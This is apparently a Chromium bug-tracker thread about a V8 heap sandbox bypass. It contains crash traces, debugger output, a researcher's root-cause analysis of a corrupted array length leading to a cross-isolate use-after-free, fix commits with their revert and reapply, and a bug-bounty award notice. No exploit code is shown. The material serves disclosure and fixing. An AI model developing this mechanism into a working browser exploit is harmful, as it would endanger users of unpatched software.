    #15 0x58a3ed2faa36 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #16 0x58a3ed2feb09 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #17 0x58a3eca93bff in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1937:7
    #18 0x58a3ec201fca in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1033:44
    #19 0x58a3ec248046 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5351:10
    #20 0x58a3ec25671c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6309:37
    #21 0x58a3ec25545e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:6217:18
    #22 0x58a3ec25a298 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:7102:18
    #23 0x7cf21ca52249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-use-after-free third_party/libc++/src/include/__atomic/support/c11.h:75:10 in int std::__Cr::__cxx_atomic_load<int>(std::__Cr::__cxx_atomic_base_impl<int> const volatile*, std::__Cr::memory_order)
Shadow bytes around the buggy address:
  0x79921bee5880: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
  0x79921bee5900: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa
  0x79921bee5980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x79921bee5a00: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x79921bee5a80: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
=>0x79921bee5b00: fd fd fd fd fd fd fd fd fa fa fa fa[fd]fd fd fd
  0x79921bee5b80: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa
  0x79921bee5c00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x79921bee5c80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x79921bee5d00: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
  0x79921bee5d80: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==303139==ABORTING


```

### da...@hirsch.cx (2025-07-10)

Would it be possible for me to have a look at the referenced bug (<https://crbug.com/396607238>) in C#7?
Thanks.

### cl...@chromium.org (2025-07-11)

I removed access restrictions from <https://crbug.com/396607238>.

### da...@hirsch.cx (2025-07-13)

Thanks!

The corrupted field seems to be the length of the Array `v23`:

```
Thread 1 "d8" hit Hardware access (read/write) watchpoint 2: *(uint32_t*) 0x7abe0018b7a4

Value = 4294967291
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7abe0018b7a4) at ../../v8/src/objects/tagged-field-inl.h:46
46      ../../v8/src/objects/tagged-field-inl.h: No such file or directory.
+bt full
#0  v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7abe0018b7a4) at ../../v8/src/objects/tagged-field-inl.h:46
No locals.
#1  v8::internal::detail::ArrayHeaderBase<v8::internal::HeapObjectLayout, true>::length (this=<optimized out>) at ../../v8/src/objects/fixed-array-inl.h:62
No locals.
#2  v8::internal::JSArray::SetLengthWouldNormalize (this=0x7bfff60d33a0, new_length=<optimized out>) at ../../v8/src/objects/objects.cc:4951
        capacity = <optimized out>
        new_capacity = <optimized out>
#3  0x000055555a2df216 in v8::internal::JSArray::SetLength (isolate=<optimized out>, array=..., new_length=<optimized out>) at ../../v8/src/objects/objects.cc:4872
[...]

```

By setting the length of this array,
`v8::internal::JSArray::SetLength` will finally call `v8::internal::Heap::RightTrimArray`:

```
Thread 1 "d8" hit Hardware access (read/write) watchpoint 2: *(uint32_t*) 0x7abe0018b7a4

Value = 4294967291
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::Acquire_Load (this=0x7abe0018b7a4) at ../../v8/src/objects/tagged-field-inl.h:74
74      in ../../v8/src/objects/tagged-field-inl.h
+bt full
#0  v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::Acquire_Load (this=0x7abe0018b7a4) at ../../v8/src/objects/tagged-field-inl.h:74
No locals.
#1  v8::internal::detail::ArrayHeaderBase<v8::internal::HeapObjectLayout, true>::length (this=<optimized out>, tag=...) at ../../v8/src/objects/fixed-array-inl.h:67
No locals.
#2  v8::internal::PrimitiveArrayBase<v8::internal::FixedDoubleArray, v8::internal::FixedDoubleArrayShape, v8::internal::HeapObjectLayout>::AllocatedSize (this=<optimized out>) at ../../v8/src/objects/fixed-array-inl.h:469
No locals.
#3  v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray> (this=0x7f0ff71efdb8, object=..., new_capacity=26927, old_capacity=<optimized out>) at ../../v8/src/heap/heap.cc:3608
        _msg = <optimized out>
        bytes_to_trim = <optimized out>
        old_size = -16
        old_end = <optimized out>
        new_end = <optimized out>
        clear_slots = <optimized out>
#4  0x0000555559c537d9 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLengthImpl (isolate=0x7f0ff71e1000, array=..., length=26927, backing_store=...) at ../../v8/src/objects/elements.cc:869
        old_length = 250
        capacity = <optimized out>
#5  v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLength (this=<optimized out>, isolate=<optimized out>, array=..., length=<optimized out>) at ../../v8/src/objects/elements.cc:817
No locals.
#6  0x000055555a2df2c3 in v8::internal::JSArray::SetLength (isolate=<optimized out>, array=..., new_length=<optimized out>) at ../../v8/src/objects/objects.cc:4875
[...]

```

In this run, `old_size` is `-16` and given the implementation of `RightTrimArray`:

```
template <typename Array>
void Heap::RightTrimArray(Tagged<Array> object, int new_capacity,
                          int old_capacity) {
  DCHECK_EQ(old_capacity, object->capacity());
  DCHECK_LT(new_capacity, old_capacity);
  DCHECK_GE(new_capacity, 0);

  if constexpr (Array::kElementsAreMaybeObject) {
    // For MaybeObject elements, this function is safe to use only at the end
    // of the mark compact collection: When marking, we record the weak slots,
    // and shrinking invalidates them.
    DCHECK_EQ(gc_state(), MARK_COMPACT);
  }

  const int bytes_to_trim = (old_capacity - new_capacity) * Array::kElementSize;

  // Calculate location of new array end.
  const int old_size = Array::SizeFor(old_capacity);
  DCHECK_EQ(object->AllocatedSize(), old_size);
  Address old_end = object.address() + old_size;
  Address new_end = old_end - bytes_to_trim;

  const bool clear_slots = MayContainRecordedSlots(object);

  // Technically in new space this write might be omitted (except for debug
  // mode which iterates through the heap), but to play safer we still do it.
  // We do not create a filler for objects in a large object space.
  if (!IsLargeObject(object)) {
    NotifyObjectSizeChange(
        object, old_size, old_size - bytes_to_trim,
        clear_slots ? ClearRecordedSlots::kYes : ClearRecordedSlots::kNo);

```

`NotifyObjectSizeChange` will be called with:

1. a negative old\_size
2. a positive new\_size
   as we can see from this log message:  
   
   `DCHECK failure in ../../v8/src/heap/heap.cc, line 4222: new_size <= old_size (215424 vs. -16)`

`NotifyObjectSizeChange` will then call `CreateFillerObjectAtRaw`:

```
  const Address filler = object.address() + new_size;
  const int filler_size = old_size - new_size;
  CreateFillerObjectAtRaw(
      WritableFreeSpace::ForNonExecutableMemory(filler, filler_size),
      clear_memory_mode, clear_recorded_slots, verify_no_slots_recorded);

```

The address `filler` is directly calculated from the passed (bogus) `new_size` and `filler_size` will be negative.

In `CreateFillerObjectAtRaw`, `VerifyNoNeedToClearSlots(addr, addr + size)` is called with an extremely large range:

```
#9  v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots (start=134956464210208, end=<optimized out>) at ../../v8/src/heap/heap.cc:3330
        chunk = 0x7abe001c0000
        space = <optimized out>
        mutable_page = <optimized out>
#10 v8::internal::Heap::CreateFillerObjectAtRaw (this=this@entry=0x7f0ff71efdb8, free_space=..., clear_memory_mode=clear_memory_mode@entry=v8::internal::ClearFreedMemoryMode::kDontClearFreedMemory, clear_slots_mode=clear_slots_mode@entry=v8::internal::ClearRecordedSlots::kNo, verify_no_slots_recorded=v8::internal::Heap::VerifyNoSlotsRecorded::kYes) at ../../v8/src/heap/heap.cc:3379
        size = 18446744073709336176
        addr = 134956464210208

```

Finally, `VerifyNoNeedToClearSlots` will try to access the heap of this chunk's owner which seems to be the (already) exited Worker:

```
#ifdef DEBUG
void VerifyNoNeedToClearSlots(Address start, Address end) {
  MemoryChunk* chunk = MemoryChunk::FromAddress(start);
  if (chunk->InReadOnlySpace()) return;
  if (!v8_flags.sticky_mark_bits && chunk->InYoungGeneration()) return;
  MutablePageMetadata* mutable_page =
      MutablePageMetadata::cast(chunk->Metadata());
  BaseSpace* space = mutable_page->owner();
  space->heap()->VerifySlotRangeHasNoRecordedSlots(start, end);
}

```

I am still examining if and how this could be triggered in a release build.

### dx...@google.com (2025-07-16)

Project: v8/v8  

Branch:  main  

Author:  Anton Bikineev [bikineev@chromium.org](mailto:bikineev@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6722280>

Check current isolate when accessing MemoryChunk metadata

---


Expand for full commit details
```
     
    With the sandbox enabled, the attacker may corrupt the page metadata 
    index to point to a metadata of the page belonging to a different 
    isolate. If that different isolate gets destroyed and the memory chunk 
    is not pulled, then the main isolate may get UaF and hence escape the 
    sandbox. 
     
    The CL embeds the owner Isolate into the MetadataTable so that whenever 
    a metadata is accessed, the caller would sandbox-check the current 
    isolate against the owner isolate. 
     
    Bug: 430498032 
    Change-Id: Iea8b2ab1e062cacb8d4ec3feb08738bfbe493baa 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6722280 
    Auto-Submit: Anton Bikineev <bikineev@chromium.org> 
    Commit-Queue: Anton Bikineev <bikineev@chromium.org> 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101453}

```

---

Files:

- M `BUILD.bazel`
- M `BUILD.gn`
- M `src/codegen/code-stub-assembler.cc`
- A `src/execution/isolate-current.h`
- M `src/execution/isolate-inl.h`
- M `src/heap/conservative-stack-visitor-inl.h`
- M `src/heap/free-list.cc`
- M `src/heap/free-list.h`
- M `src/heap/heap-inl.h`
- M `src/heap/heap.cc`
- M `src/heap/heap.h`
- M `src/heap/main-allocator.cc`
- M `src/heap/marking-inl.h`
- M `src/heap/marking-state-inl.h`
- M `src/heap/marking-state.h`
- M `src/heap/marking.h`
- M `src/heap/memory-allocator.cc`
- M `src/heap/memory-chunk-inl.h`
- M `src/heap/memory-chunk-metadata-inl.h`
- M `src/heap/memory-chunk-metadata.h`
- M `src/heap/memory-chunk.cc`
- M `src/heap/memory-chunk.h`
- M `src/heap/memory-pool.cc`
- M `src/heap/memory-pool.h`
- M `src/heap/mutable-page-metadata-inl.h`
- M `src/heap/mutable-page-metadata.h`
- M `src/heap/page-metadata-inl.h`
- M `src/heap/page-metadata.h`
- M `src/heap/paged-spaces-inl.h`
- M `src/heap/scavenger.cc`
- M `src/init/isolate-group.cc`
- M `src/init/isolate-group.h`
- M `src/objects/free-space-inl.h`
- M `src/objects/free-space.h`
- M `tools/debug_helper/get-object-properties.cc`

---

Hash: [ebff29f7a9afe97a2b28c27415df9615dbccea38](http://crrev.com/ebff29f7a9afe97a2b28c27415df9615dbccea38)  

Date: Wed Jul 16 11:24:45 2025


---

### bi...@chromium.org (2025-07-16)

I was not able to reproduce the issue on the provided POCs. David, could you please try to reproduce the issue with the fix in [#comment24](https://issues.chromium.org/issues/430498032#comment24)?

### dx...@google.com (2025-07-16)

Project: v8/v8  

Branch:  main  

Author:  Anton Bikineev [bikineev@chromium.org](mailto:bikineev@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6759918>

Fix the issue with the new metadata table entry on TSAN build

---


Expand for full commit details
```
     
    MemoryChunk::IsReadOnlySpace() synchronize-loads the heap pointer from 
    the corresponding metadata and therefore cannot be called when 
    initializing the metadata table entry. 
     
    Bug: 430498032 
    Change-Id: I140ae121f8e7a19848df8ec77b75658111391f6b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6759918 
    Commit-Queue: Anton Bikineev <bikineev@chromium.org> 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Auto-Submit: Anton Bikineev <bikineev@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101460}

```

---

Files:

- M `src/heap/memory-chunk.cc`
- M `src/init/isolate-group.cc`
- M `src/init/isolate-group.h`

---

Hash: [5c4b14e1c1504f5d0faf605c18022d8b9385b1cb](http://crrev.com/5c4b14e1c1504f5d0faf605c18022d8b9385b1cb)  

Date: Wed Jul 16 14:22:22 2025


---

### dx...@google.com (2025-07-16)

Project: v8/v8  

Branch:  main  

Author:  Rezvan Mahdavi Hezaveh [rezvan@chromium.org](mailto:rezvan@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6762613>

Revert "Fix the issue with the new metadata table entry on TSAN build"

---


Expand for full commit details
```
     
    This reverts commit 5c4b14e1c1504f5d0faf605c18022d8b9385b1cb. 
     
    Reason for revert: parent cl of this one causes failure on  
    https://ci.chromium.org/ui/p/v8/builders/luci.v8.ci/Linux%20V8%20FYI%20Release%20%28NVIDIA%29 
     
    Bug: 430498032 
    Original change's description: 
    > Fix the issue with the new metadata table entry on TSAN build 
    > 
    > MemoryChunk::IsReadOnlySpace() synchronize-loads the heap pointer from 
    > the corresponding metadata and therefore cannot be called when 
    > initializing the metadata table entry. 
    > 
    > Bug: 430498032 
    > Change-Id: I140ae121f8e7a19848df8ec77b75658111391f6b 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6759918 
    > Commit-Queue: Anton Bikineev <bikineev@chromium.org> 
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    > Auto-Submit: Anton Bikineev <bikineev@chromium.org> 
    > Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#101460} 
     
    Bug: 430498032 
    No-Presubmit: true 
    No-Tree-Checks: true 
    No-Try: true 
    Change-Id: Ie4af3ad7fca688fe4a25f7e5cb1e1560cb0fb028 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6762613 
    Owners-Override: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
    Auto-Submit: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101469}

```

---

Files:

- M `src/heap/memory-chunk.cc`
- M `src/init/isolate-group.cc`
- M `src/init/isolate-group.h`

---

Hash: [c05de5d54c058bfa6b2ee505a086c4f33d70016f](http://crrev.com/c05de5d54c058bfa6b2ee505a086c4f33d70016f)  

Date: Wed Jul 16 20:47:49 2025


---

### dx...@google.com (2025-07-16)

Project: v8/v8  

Branch:  main  

Author:  Rezvan Mahdavi Hezaveh [rezvan@chromium.org](mailto:rezvan@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6762616>

Revert "Check current isolate when accessing MemoryChunk metadata"

---


Expand for full commit details
```
     
    This reverts commit ebff29f7a9afe97a2b28c27415df9615dbccea38. 
     
    Reason for revert: cause failure on https://ci.chromium.org/ui/p/v8/builders/luci.v8.ci/Linux%20V8%20FYI%20Release%20%28NVIDIA%29 
     
    Bug: 430498032 
    Original change's description: 
    > Check current isolate when accessing MemoryChunk metadata 
    > 
    > With the sandbox enabled, the attacker may corrupt the page metadata 
    > index to point to a metadata of the page belonging to a different 
    > isolate. If that different isolate gets destroyed and the memory chunk 
    > is not pulled, then the main isolate may get UaF and hence escape the 
    > sandbox. 
    > 
    > The CL embeds the owner Isolate into the MetadataTable so that whenever 
    > a metadata is accessed, the caller would sandbox-check the current 
    > isolate against the owner isolate. 
    > 
    > Bug: 430498032 
    > Change-Id: Iea8b2ab1e062cacb8d4ec3feb08738bfbe493baa 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6722280 
    > Auto-Submit: Anton Bikineev <bikineev@chromium.org> 
    > Commit-Queue: Anton Bikineev <bikineev@chromium.org> 
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#101453} 
     
    Bug: 430498032 
    No-Presubmit: true 
    No-Tree-Checks: true 
    No-Try: true 
    Change-Id: I263b9c1592f3b980740d10c9bceb1e23af4bd3db 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6762616 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
    Auto-Submit: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
    Owners-Override: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101471}

```

---

Files:

- M `BUILD.bazel`
- M `BUILD.gn`
- M `src/codegen/code-stub-assembler.cc`
- D `src/execution/isolate-current.h`
- M `src/execution/isolate-inl.h`
- M `src/heap/conservative-stack-visitor-inl.h`
- M `src/heap/free-list.cc`
- M `src/heap/free-list.h`
- M `src/heap/heap-inl.h`
- M `src/heap/heap.cc`
- M `src/heap/heap.h`
- M `src/heap/main-allocator.cc`
- M `src/heap/marking-inl.h`
- M `src/heap/marking-state-inl.h`
- M `src/heap/marking-state.h`
- M `src/heap/marking.h`
- M `src/heap/memory-allocator.cc`
- M `src/heap/memory-chunk-inl.h`
- M `src/heap/memory-chunk-metadata-inl.h`
- M `src/heap/memory-chunk-metadata.h`
- M `src/heap/memory-chunk.cc`
- M `src/heap/memory-chunk.h`
- M `src/heap/memory-pool.cc`
- M `src/heap/memory-pool.h`
- M `src/heap/mutable-page-metadata-inl.h`
- M `src/heap/mutable-page-metadata.h`
- M `src/heap/page-metadata-inl.h`
- M `src/heap/page-metadata.h`
- M `src/heap/paged-spaces-inl.h`
- M `src/heap/scavenger.cc`
- M `src/init/isolate-group.cc`
- M `src/init/isolate-group.h`
- M `src/objects/free-space-inl.h`
- M `src/objects/free-space.h`
- M `tools/debug_helper/get-object-properties.cc`

---

Hash: [12f6c95819bb360fcbc68b0f2597e87c496d397f](http://crrev.com/12f6c95819bb360fcbc68b0f2597e87c496d397f)  

Date: Wed Jul 16 20:51:24 2025


---

### da...@hirsch.cx (2025-07-16)

Anton, thanks for the fix.

I am not able to reproduce both the OOB and the UAF on `01b10ce6efd4ad19352114f38e775d94f5d96900` (just before the reverts). I am also unable to hit the nullpointer deref.

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
2
1
# Ignoring debug check failure in ../../src/heap/heap.cc, line 3626: new_capacity < old_capacity (26927 vs. -673021702)
# Ignoring debug check failure in ../../src/heap/heap.cc, line 4254: new_size <= old_size (215424 vs. -1089206312)
# Ignoring debug check failure in ../../src/heap/heap.cc, line 3338: size > 2 * kTaggedSize (-1089421736 vs. 8)
Caught harmless memory access violation (inside sandbox address space). Exiting process...

```

It is also possible to hit your new CHECK:

```
# Ignoring debug check failure in ../../src/heap/heap.cc, line 3626: new_capacity < old_capacity (25528 vs. -673021828)
# Ignoring debug check failure in ../../src/heap/heap.cc, line 4254: new_size <= old_size (204232 vs. -1089207320)
# Ignoring debug check failure in ../../src/heap/heap.cc, line 3338: size > 2 * kTaggedSize (-1089411552 vs. 8)
# Ignoring debug check failure in ../../src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089411552 vs. 8)


#
# Safely terminating process due to error in ../../src/init/isolate-group.h, line 172
# The following harmless error was encountered: Check failed: isolate_ == isolate (0x7f0ff7009000 vs. 0x7f0ff6fe1000).
#
#
#
#FailureMessage Object: 0x7bfff6145460
Thread 1 "d8" hit Breakpoint 1, 0x0000555557dc72e2 in v8::base::debug::StackTrace::StackTrace() ()
(gdb) bt full
+bt full
#0  0x0000555557dc72e2 in v8::base::debug::StackTrace::StackTrace() ()
#1  0x0000555557dc431f in v8::platform::(anonymous namespace)::PrintStackTrace() ()
#2  0x0000555557dafb6a in V8_Fatal(char const*, int, char const*, ...) ()
#3  0x00005555579a4ead in v8::internal::MemoryChunkMetadata* v8::internal::MemoryChunk::MetadataImpl<true>(v8::internal::Isolate const*) ()
#4  0x0000555558af464e in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) ()
#5  0x0000555558ab92a5 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) ()
#6  0x0000555558ab9f1f in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) ()
#7  0x00005555595d733d in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) ()
#8  0x0000555559c77e93 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) ()
#9  0x0000555557f15838 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) ()
#10 0x00005555599c7289 in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) ()
#11 0x0000555559c5e300 in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) ()
#12 0x0000555559c6935e in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) ()
#13 0x0000555559c6888d in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) ()
#14 0x000055555997854f in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) ()
#15 0x0000555559994407 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) ()
#16 0x00005555599934d9 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) ()
#17 0x000055555f39667d in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit ()
#18 0x000055555f570854 in Builtins_SetNamedPropertyHandler ()

```

If I understand the fix correctly, this would have caused a sandbox violation.

Occassionally hitting another DCHECK, but I guess that is fine:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
2
1
# Ignoring debug check failure in ../../src/objects/elements.cc, line 344: (copy_size + static_cast<int>(to_start)) <= to_base->length() && (copy_size + static_cast<int>(from_start)) <= from_base->length()

```

### bi...@chromium.org (2025-07-17)

```
#
# Safely terminating process due to error in ../../src/init/isolate-group.h, line 172
# The following harmless error was encountered: Check failed: isolate_ == isolate (0x7f0ff7009000 vs. 0x7f0ff6fe1000).

```

That's exactly the check that must fail. Thanks for confirming!

### dx...@google.com (2025-07-17)

Project: v8/v8  

Branch:  main  

Author:  Anton Bikineev [bikineev@chromium.org](mailto:bikineev@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6765067>

Reapply "Check current isolate when accessing MemoryChunk metadata"

---


Expand for full commit details
```
     
    The parallel jobs from ParallelWeakHandlesProcessor don't have the 
    current isolate set up, so many checks fail. The fix adds the setting 
    scopes. 
     
    Bug: 430498032 
    Change-Id: I5bc90983123bf09eab8c21ac7704bb82367b82a1 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6765067 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Anton Bikineev <bikineev@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101492}

```

---

Files:

- M `src/codegen/code-stub-assembler.cc`
- M `src/handles/traced-handles.cc`
- M `src/heap/conservative-stack-visitor-inl.h`
- M `src/heap/free-list.cc`
- M `src/heap/free-list.h`
- M `src/heap/heap-inl.h`
- M `src/heap/heap.cc`
- M `src/heap/heap.h`
- M `src/heap/main-allocator.cc`
- M `src/heap/marking-inl.h`
- M `src/heap/marking-state-inl.h`
- M `src/heap/marking-state.h`
- M `src/heap/marking.h`
- M `src/heap/memory-allocator.cc`
- M `src/heap/memory-chunk-inl.h`
- M `src/heap/memory-chunk-metadata-inl.h`
- M `src/heap/memory-chunk-metadata.h`
- M `src/heap/memory-chunk.cc`
- M `src/heap/memory-chunk.h`
- M `src/heap/memory-pool.cc`
- M `src/heap/memory-pool.h`
- M `src/heap/mutable-page-metadata-inl.h`
- M `src/heap/mutable-page-metadata.h`
- M `src/heap/page-metadata-inl.h`
- M `src/heap/page-metadata.h`
- M `src/heap/paged-spaces-inl.h`
- M `src/heap/scavenger.cc`
- M `src/init/isolate-group.cc`
- M `src/init/isolate-group.h`
- M `src/objects/free-space-inl.h`
- M `src/objects/free-space.h`
- M `tools/debug_helper/get-object-properties.cc`

---

Hash: [a9cd07eb66db53ee3760795c8dbab13ac44508ac](http://crrev.com/a9cd07eb66db53ee3760795c8dbab13ac44508ac)  

Date: Thu Jul 17 09:36:19 2025


---

### sp...@google.com (2025-07-24)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
report of V8 sandbox bypass demonstrating memory corruption outside the V8 heap sandbox


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### da...@hirsch.cx (2025-07-24)

Thanks for the reward! :)

### da...@hirsch.cx (2025-07-24)

Unfortunately, I have just noticed that the fuzzer is still able to trigger the heap buffer overflow on `V8 version 14.0.281` with the attached program (ASAN stacktrace + gdb watchpoint on the corrupted address):

```
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1611709 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3199057647
0x00005555597fc3a2 in v8::internal::MemsetUint32 (dest=0x7aef00180000, value=3199057647, counter=65536) at ../../v8/src/utils/memcopy.h:278
278     ../../v8/src/utils/memcopy.h: No such file or directory.
+info args
dest = 0x7aef00180000
value = 3199057647
counter = 65536
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Old value = 3199057647
New value = 18
